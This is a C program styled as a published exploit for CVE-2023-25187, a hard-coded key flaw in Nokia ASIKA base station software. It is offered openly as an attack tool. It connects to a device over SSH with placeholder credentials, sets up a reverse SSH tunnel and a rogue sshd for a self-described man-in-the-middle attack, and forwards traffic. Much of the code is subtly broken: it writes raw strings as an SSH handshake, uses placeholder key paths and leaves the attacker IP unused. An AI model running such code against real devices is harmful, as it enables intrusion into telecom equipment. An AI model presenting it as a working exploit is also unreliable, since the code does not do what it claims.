// Exploit Title: Nokia ASIKA 7.13.52 - Hard-coded private key disclosure
// Date: 2023-06-20
// Exploit Author: Amirhossein Bahramizadeh
// Category : Hardware
// Vendor Homepage: https://www.nokia.com/about-us/security-and-privacy/product-security-advisory/cve-2023-25187/
// Version: 7.13.52 (REQUIRED)
// Tested on: Windows/Linux
// CVE : CVE-2023-25187

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

// The IP address of the vulnerable device
char *host = "192.168.1.1";

// The default SSH port number
int port = 22;

// The username and password for the BTS service user account
char *username = "service_user";
char *password = "password123";

// The IP address of the attacker's machine
char *attacker_ip = "10.0.0.1";

// The port number to use for the MITM attack
int attacker_port = 2222;

// The maximum length of a message
#define MAX_LEN 1024

// Forward data between two sockets
void forward_data(int sock1, int sock2)
{
    char buffer[MAX_LEN];
    ssize_t bytes_read;

    while ((bytes_read = read(sock1, buffer, MAX_LEN)) > 0)
    {
        write(sock2, buffer, bytes_read);
    }
}

int main()
{
    int sock, pid1, pid2;
    struct sockaddr_in addr;
    char *argv[] = {"/usr/bin/ssh", "-l", username, "-p", "2222", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "PasswordAuthentication=no", "-o", "PubkeyAuthentication=yes", "-i", "/path/to/private/key", "-N", "-R", "2222:localhost:22", host, NULL};

    // Create a new socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Set the address to connect to
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    // Connect to the vulnerable device
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        fprintf(stderr, "Error connecting to %s:%d: %s\n", host, port, strerror(errno));
        exit(1);
    }

    // Send the SSH handshake
    write(sock, "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10\r\n", 42);
    read(sock, NULL, 0);

    // Send the username
    write(sock, username, strlen(username));
    write(sock, "\r\n", 2);
    read(sock, NULL, 0);

    // Send the password
    write(sock, password, strlen(password));
    write(sock, "\r\n", 2);

    // Wait for the authentication to complete
    sleep(1);

    // Start an SSH client on the attacker's machine
    pid1 = fork();
    if (pid1 == 0)
    {
        execv("/usr/bin/ssh", argv);
        exit(0);
    }

    // Start an SSH server on the attacker's machine
    pid2 = fork();
    if (pid2 == 0)
    {
        execl("/usr/sbin/sshd", "/usr/sbin/sshd", "-p", "2222", "-o", "StrictModes=no", "-o", "PasswordAuthentication=no", "-o", "PubkeyAuthentication=yes", "-o", "AuthorizedKeysFile=/dev/null", "-o", "HostKey=/path/to/private/key", NULL);
        exit(0);
    }

    // Wait for the SSH server to start
    sleep(1);

    // Forward data between the client and the server
    pid1 = fork();
    if (pid1 == 0)
    {
        forward_data(sock, STDIN_FILENO);
        exit(0);
    }
    pid2 = fork();
    if (pid2 == 0)
    {
        forward_data(STDOUT_FILENO, sock);
        exit(0);
    }

    // Wait for the child processes to finish
    waitpid(pid1, NULL, 0);
    waitpid(pid2, NULL, 0);

    // Close the socket
    close(sock);

    return 0;
}